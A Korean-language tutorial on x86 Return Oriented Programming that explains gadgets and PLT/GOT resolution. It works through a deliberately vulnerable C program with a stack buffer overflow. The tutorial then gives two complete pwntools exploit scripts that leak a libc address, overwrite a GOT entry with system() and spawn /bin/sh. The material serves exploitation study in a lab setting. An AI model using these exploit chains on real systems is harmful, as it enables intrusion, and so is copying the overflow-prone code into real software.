# ROP(Return Oriented Programming) - x86

- ROP는 공격자가 NXbit 및 코드 서명(Code signing)과 같은 보안 방어가 있는 상태에서 코드를 실행할 수 있게 해주는 기술이다.
- RTL + Gadgets
- 이 기법에서 공격자는 프로그램의 흐름을 변경하기 위해 Stack Overflow 취약성이 필요하고, "가젯(Gadgets)"이라고 하는 해당 프로그램이 사용하는 기계 명령어가 필요하다.

-> 각 가젯은 일반적으로 반환 명령어(ret)으로 끝이나며, 기존 프로그램 또는 공유 라이브러리 코드 내의 서브 루틴에 있다. 가젯과 취약성을 사용하면 공격자가 임의의 작업을 수행할 수 있다.



## Gadgets - POP; POP; POP; RET

- ROP는 기본적으로 RTL 기법을 이용하며, 공격자는 RTL과 Gadgets을 이용해 공격에 필요한 코드를 프로그래밍하는 것이다. 
- 그러나 프로그램 및 운영체제 등 다양한 상황에 따라 여러 개의 함수 호출이 필요할 수 있다. 여러개의 함수를 호출하기 위해 사용되는 것이 바로 Gadgets이며, 기본적으로 다음과 같은 Gadgets이 사용된다.

-> 호출하는 함수의 인자의 개수만큼 pop;이 사용되고 ret이 붙는다. (ex. 호출하는 함수의 인자가 3개 : "pop; pop; pop; ret" /  호출하는 함수의 인자가 0개 : "ret")

- Gadgets의 역할은 ESP  레지스터의 값을 증가시키는 것이다. 즉, RTL에 의해 호출되는 함수에 전당되는 인자 값이 저장된 영역을 지나 다음 함수가 호출될 수 있도록 한다. (x86 바이너리에서는 pop 명령어의  피연산자 값은 중요하지 않다.)
- RTL에서 호출할 함수의 다음 영역에 Gadgets의 주소를 저장하면 연속해서 다음 함수가 호출될 수 있다.



## PLT & GOT

- PLT(Procedure linkage table, 프로시저 링키지 테이블)에는 동적 링커가 공유 라이브러리의 함수를 호출하기 위한 코드가 저장된다. (이 정보들은 ".plt" 섹션에 저장되어 있음.)

- GOT(Global offset table, 전역 오프셋 테이블)에는 동적 링커에 의해 공유 라이브러리에서 호출할 함수의 주소가 저장된다. 

  -> 이 정보들은 ".got.plt" 섹션에 저장된다. 이 섹션들은 공격자들의 공격 대상이 되며, 주로 힙(.bss) Exploit에 의해 포인터 값을 변조한다.

### Debug

다음과 같이 PLT & GOT 영역의 내용 및 값의 변경을 확인할 수 있다.

```c
//Example code -> rop.c

#include <stdio.h>
#include <unistd.h>
  
void vuln(){
    char buf[50];
    read(0, buf, 256);
}
 
void main(){
    write(1,"Hello ROP\n",10);
    vuln();
}
```

> gcc -m32 -fno-stack-protector -o rop rop.c

![image](https://user-images.githubusercontent.com/59410565/119005915-d8fe2a00-b9ca-11eb-9bb7-8ce11df0aed4.png)

**[Break Point]**

- 0x0804843b : vuln 함수 코드 첫 부분
- 0x0804844f : read() 함수 호출 전

![image](https://user-images.githubusercontent.com/59410565/119006413-50cc5480-b9cb-11eb-956b-7f5fddf9aadb.png)

![image](https://user-images.githubusercontent.com/59410565/119006855-b1f42800-b9cb-11eb-9eab-a25b944ee534.png)

- 즉, 62개 이상의 문자를 입력함으로써 Return address를 덮어 쓸 수 있다.

![image](https://user-images.githubusercontent.com/59410565/119007355-1d3dfa00-b9cc-11eb-9988-a33c11881e9d.png)

- read@plt 영역에는 libc에서 read() 함수를 호출하기 위한 코드가 저장되어 있다.

```python
from pwn import *

e = ELF("./rop")
print("read@plt : " + str(hex(e.plt["read"])))
print("read@got : " + str(hex(e.got["read"])))
```

> pwndbg에는 elfsymbol 명령어가 없어서 pwntools에서 주소를 출력하였다.

![image](https://user-images.githubusercontent.com/59410565/119010694-4ad87280-b9cf-11eb-9a19-df8169d68647.png)

- .plt :  0x80483000
- .got.plt : 0x804a00c

![image](https://user-images.githubusercontent.com/59410565/119011740-4cef0100-b9d0-11eb-881e-b59b43adc266.png)

- read@got(0x804a00c) 영역에 저장된 주소로 이동하고 그 곳에는 < read@plt+6 > (0x8048306) 영역의 주소가 저장되어 있다. 해당 프로그램에서 read() 함수가 한 번도 호출되지 않았기 때문이다.
- < read@plt+11 > 의 "jmp 0x80482f0" 코드에 의해 _dl_runtime_resolve() 함수를 호출한다. 해당 함수는 libc에서 찾고자하는 함수(read)의 주소를 .got.plt 영역에 저장한다.

![image](https://user-images.githubusercontent.com/59410565/119012609-25e4ff00-b9d1-11eb-896d-49a2bb29d0fd.png)

![image](https://user-images.githubusercontent.com/59410565/119012690-34cbb180-b9d1-11eb-9a48-6b9a5c0a449a.png)

- read() 함수가 호출된 후 read@got(0x804a00c) 영역에는 libc의 read() 함수 주소가 저장되어 있다.



## Exploit

```
Exploit 순서

1. read 함수를 이용해 "/bin/sh" 명령을 쓰기 가능한 메모리 영역에 저장
2. write 함수를 이용해 read 함수의 .got 영역에 저장된 값을 출력
3. read 함수를 이용해 read 함수의 .got 영역에 system 함수의 주소로 덮어씀
4. read 함수 호출 -  read .got영역에 system 함수의 주소가 저장되어 있기 때문에 system 함수가 호출됨
```

```python
#ROP code

read(0, writableArea, len(str(binsh)))
write(1, read_got, len(str(read_got)))
read(0, read_got, len(str(read_got)))
system(writableArea)
```

**[확인해야 할 정보 목록]**

- [ ] "/bin/sh" 명령을 저장할 수 있는 쓰기 가능한 메모리 공간
- [ ] read(), write() 함수의 plt, got
- [ ] system() 함수의 주소
- [ ] pop, pop, pop, ret 가젯의 위치

### Finding a writable memory space

![image](https://user-images.githubusercontent.com/59410565/119014593-1666b580-b9d3-11eb-8eac-09092a4615a1.png)

해당 바이너리의 0x084a000 ~ 0x084b000 영역에 쓰기 권한이 부여되어 있다.

![image](https://user-images.githubusercontent.com/59410565/119015149-9bea6580-b9d3-11eb-80f2-b3848748c6d6.png)

![image](https://user-images.githubusercontent.com/59410565/119015259-b4f31680-b9d3-11eb-9e33-8831c7f35c05.png)

.got.plt(0x0804a000)/ .data(0x084a018)/.bss(0x0804a020)이 앞에서 확인한 쓰기 가능한 영역에 포함되어 있다.



### Find gadget

> rp++

![image](https://user-images.githubusercontent.com/59410565/119016376-d30d4680-b9d4-11eb-847a-38f8ed0c47ba.png)

> ROPgadget

![image](https://user-images.githubusercontent.com/59410565/119016841-57f86000-b9d5-11eb-8bf3-fbd7c26abc5e.png)



### Find plt, got address - read, write

![image](https://user-images.githubusercontent.com/59410565/119017082-9726b100-b9d5-11eb-8897-9e932504bdd0.png)



### Find the address of the system() function

![image](https://user-images.githubusercontent.com/59410565/119017353-e40a8780-b9d5-11eb-960e-d3bc0adac678.png)



### Exploit code

```python
from pwn import *
from struct import *
 
#context.log_level = 'debug'
  
binsh = "/bin/sh"
  
stdin = 0
stdout = 1
  
read_plt = 0x8048300
read_got = 0x804a00c
write_plt = 0x8048320
write_got = 0x804a014

read_system_offset = 0x9ae70
writableArea = 0x0804a020 #.bss
pppr = 0x80484e9 #pop pop pop ret
  
payload = "A"*62
 
 
#read(0,writableArea,len(str(binsh)))
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(stdin)
payload += p32(writableArea)
payload += p32(len(str(binsh)))
 
#write(1,read_got,len(str(read_got)))
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(stdout)
payload += p32(read_got)
payload += p32(4)
 
#read(0,read_got,len(str(read_got)))
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(stdin)
payload += p32(read_got)
payload += p32(len(str(read_got)))
 
#system(writableArea)
payload += p32(read_plt)
payload += p32(0xaaaabbbb)
payload += p32(writableArea)
  
r = process('./rop')
r.recvn(10)
r.send(payload + '\n')
r.send(binsh)
read = u32(r.recvn(4))
system_addr = read - read_system_offset
r.send(p32(system_addr))
r.interactive()
```

결과

![image](https://user-images.githubusercontent.com/59410565/119018652-47e18000-b9d7-11eb-86ec-b555a339df0a.png)



+) 참고 : pwntools에서 제공하는 ROP 기능을 이용해 조금 더 간편하게 작성할 수 있다.

```python
from pwn import *
from struct import *
 
#context.log_level = 'debug'
 
binsh = "/bin/sh"
 
binary = ELF('./rop')
 
#32bit OS
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
#64bit OS
#libc = ELF("/lib32/libc-2.23.so")
rop = ROP(binary)
 
print binary.checksec()
 
read_plt = binary.plt['read']
read_got = binary.got['read']
write_plt = binary.plt['write']
write_got = binary.got['write']
read_system_offset = libc.symbols['read'] - libc.symbols['system']
writableArea = 0x0804a020
 
#Address info
log.info("read@plt : " + str(hex(read_plt)))
log.info("read@got : " + str(hex(read_got)))
log.info("write@plt : " + str(hex(write_plt)))
log.info("write@got : " + str(hex(write_got)))
log.info("read system offset : " + str(hex(read_system_offset)))
log.info("Writeable area : " + str(writableArea))
 
#ROP Code
rop.read(0,writableArea,len(str(binsh)))
rop.write(1,read_got,4)
rop.read(0,read_got,len(str(read_got)))
rop.raw(read_plt)
rop.raw(0xaaaabbbb)
rop.raw(writableArea)
payload = "A"*62 + str(rop)
 
#Run
r = process("./rop")
r.recvn(10)
r.send(payload + '\n')
r.send(binsh)
read = u32(r.recvn(4))
system_addr = read - read_system_offset
rop = ROP(binary)
rop.raw(system_addr)
r.send(str(rop))
 
r.interactive()
```

